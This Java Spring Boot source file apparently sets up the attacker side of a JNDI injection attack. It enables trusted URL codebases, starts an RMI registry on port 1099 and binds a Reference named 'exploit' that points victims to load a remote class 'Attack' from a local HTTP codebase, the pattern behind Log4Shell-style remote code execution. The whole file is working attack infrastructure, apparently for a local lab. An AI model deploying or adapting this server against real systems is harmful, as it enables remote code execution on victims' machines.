package io.reactive.asweb;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import lombok.extern.slf4j.Slf4j;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import javax.management.InstanceAlreadyExistsException;
import javax.management.MBeanRegistrationException;
import javax.management.MalformedObjectNameException;
import javax.management.NotCompliantMBeanException;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

@SpringBootApplication
@Slf4j
public class AswebApplication {

	public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
		System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
		System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
		//start a rmi server
		Registry registry = LocateRegistry.createRegistry(1099);
		//注册获取远程信息
		Reference exploit = new Reference("Attack", "Attack", "http://127.0.0.1:8080/");
		ReferenceWrapper refObjWrapper = new ReferenceWrapper(exploit);
		//绑定服务
		System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/exploit'");
		registry.bind("exploit", refObjWrapper);

		SpringApplication.run(AswebApplication.class, args);
	}
}
